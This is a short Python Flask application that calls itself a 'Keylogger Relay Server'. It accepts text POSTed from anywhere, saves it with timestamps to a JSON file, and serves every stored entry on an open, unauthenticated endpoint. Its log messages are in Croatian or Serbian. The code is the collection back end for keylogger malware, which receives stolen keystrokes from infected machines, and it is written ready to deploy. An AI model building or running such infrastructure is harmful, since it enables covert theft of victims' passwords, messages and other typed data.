import os
import json
import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

LOG_FILE = "logs.json"

def load_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding='utf-8') as f:
            return json.load(f)
    return []

def save_logs(logs):
    with open(LOG_FILE, "w", encoding='utf-8') as f:
        json.dump(logs, f, indent=2, ensure_ascii=False)

@app.route('/log', methods=['POST'])
def receive_log():
    try:
        data = request.get_data(as_text=True)
        if not data:
            return "Empty", 400

        logs = load_logs()
        timestamp = datetime.datetime.now().isoformat()
        logs.append({
            'timestamp': timestamp,
            'data': data
        })
        save_logs(logs)
        print(f"Primljeno: {data[:100]}...")
        return "OK", 200
    except Exception as e:
        print(f"Greška: {e}")
        return "Error", 500

@app.route('/logs', methods=['GET'])
def get_logs():
    logs = load_logs()
    return jsonify(logs)

@app.route('/')
def home():
    return "Keylogger Relay Server radi!"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
